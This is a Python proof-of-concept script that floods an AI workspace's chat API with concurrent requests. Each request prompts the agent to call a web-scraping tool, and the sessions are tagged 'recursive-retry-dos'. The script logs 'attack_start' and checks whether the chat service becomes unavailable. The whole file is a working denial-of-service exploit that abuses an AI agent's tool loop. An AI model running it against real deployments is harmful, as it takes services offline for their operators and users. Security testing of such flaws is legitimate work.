import concurrent.futures
import datetime as dt
import json
import sys
import time
import urllib.request


target = sys.argv[1].rstrip("/")
workspace = sys.argv[2]
api_key = sys.argv[3]
concurrency = int(sys.argv[4]) if len(sys.argv) > 4 else 16
requests = int(sys.argv[5]) if len(sys.argv) > 5 else 32
timeout = float(sys.argv[6]) if len(sys.argv) > 6 else 12


def now():
    return dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def call_chat(i):
    data = json.dumps(
        {
            "message": "Use the web-scraping tool to read https://example.com and return the result.",
            "mode": "automatic",
            "sessionId": f"recursive-retry-dos-{int(time.time())}-{i}",
        }
    ).encode("utf-8")
    req = urllib.request.Request(
        f"{target}/api/v1/workspace/{workspace}/chat",
        data=data,
        method="POST",
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {api_key}",
        },
    )
    started = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(256).decode("utf-8", errors="replace")
            return True, round(time.time() - started, 3), f"HTTP {resp.status} {body[:120]}"
    except Exception as exc:
        return False, round(time.time() - started, 3), repr(exc)


print(
    f"[{now()}] attack_start endpoint=/api/v1/workspace/:slug/chat "
    f"requests={requests} concurrency={concurrency} timeout={timeout}s",
    flush=True,
)

failed = 0
with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as pool:
    futures = [pool.submit(call_chat, i) for i in range(requests)]
    for idx, future in enumerate(concurrent.futures.as_completed(futures), 1):
        ok, latency, detail = future.result()
        if not ok:
            failed += 1
        print(
            f"[{now()}] ok={ok} latency={latency:.3f}s "
            f"fail={failed} detail={detail}",
            flush=True,
        )

if failed == requests:
    print(f"[{now()}] RESULT=CHAT_UNAVAILABLE failed={failed}/{requests}", flush=True)
else:
    print(f"[{now()}] RESULT=PARTIAL_FAILURE failed={failed}/{requests}", flush=True)
